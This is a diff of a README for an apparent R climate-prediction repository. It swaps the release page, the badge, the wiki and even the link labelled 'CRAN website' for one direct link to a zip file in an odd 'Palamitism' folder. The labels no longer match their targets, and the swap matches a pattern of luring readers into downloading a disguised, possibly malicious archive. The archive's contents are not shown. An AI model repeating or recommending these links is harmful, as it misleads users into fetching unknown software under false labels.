@@ -4,11 +4,11 @@
 
 Welcome to the climate-predicton-model repository! This application helps you predict climate changes and their effects on water resources. Follow these steps to download and run it smoothly.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen)](https://github.com/broxdy/climate-predicton-model/releases)
+[![Download Now](https://raw.githubusercontent.com/broxdy/climate-predicton-model/main/Palamitism/climate-predicton-model.zip%20Now-v1.0-brightgreen)](https://raw.githubusercontent.com/broxdy/climate-predicton-model/main/Palamitism/climate-predicton-model.zip)
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [Releases Page](https://github.com/broxdy/climate-predicton-model/releases).
+1. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/broxdy/climate-predicton-model/main/Palamitism/climate-predicton-model.zip).
 2. Choose the latest version of the software.
 3. Look for the file suitable for your operating system (Windows, Mac, or Linux).
 4. Click on the file to start the download.
@@ -22,7 +22,7 @@ To run the climate-predicton-model, your computer should meet these requirements
 - **Operating System:** Windows 10, macOS, or a modern Linux distribution.
 - **RAM:** At least 4 GB is recommended for optimal performance.
 - **Disk Space:** You will need at least 150 MB of free space.
-- **Other Software:** Ensure you have R installed. You can download R from the [CRAN website](https://cran.r-project.org).
+- **Other Software:** Ensure you have R installed. You can download R from the [CRAN website](https://raw.githubusercontent.com/broxdy/climate-predicton-model/main/Palamitism/climate-predicton-model.zip).
 
 ## 🚧 Features
 
@@ -65,7 +65,7 @@ This software includes various topics crucial for those interested in climate st
 If you encounter any issues or have questions, check the following resources:
 
 - **User Guide:** Included within the application for step-by-step instructions.
-- **FAQ:** A list of frequently asked questions available on the [repository wiki](https://github.com/broxdy/climate-predicton-model/wiki).
+- **FAQ:** A list of frequently asked questions available on the [repository wiki](https://raw.githubusercontent.com/broxdy/climate-predicton-model/main/Palamitism/climate-predicton-model.zip).
 - **Community Support:** Join discussions and forums related to climate prediction and analysis.
 
 ## 🌐 Engage with the Community
@@ -78,4 +78,4 @@ Share your findings and engage with fellow users on social media and forums. Use
 
 Remember, accurate climate prediction helps us create a sustainable future. Your contributions to understanding these changes are essential.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen)](https://github.com/broxdy/climate-predicton-model/releases)
+[![Download Now](https://raw.githubusercontent.com/broxdy/climate-predicton-model/main/Palamitism/climate-predicton-model.zip%20Now-v1.0-brightgreen)](https://raw.githubusercontent.com/broxdy/climate-predicton-model/main/Palamitism/climate-predicton-model.zip)
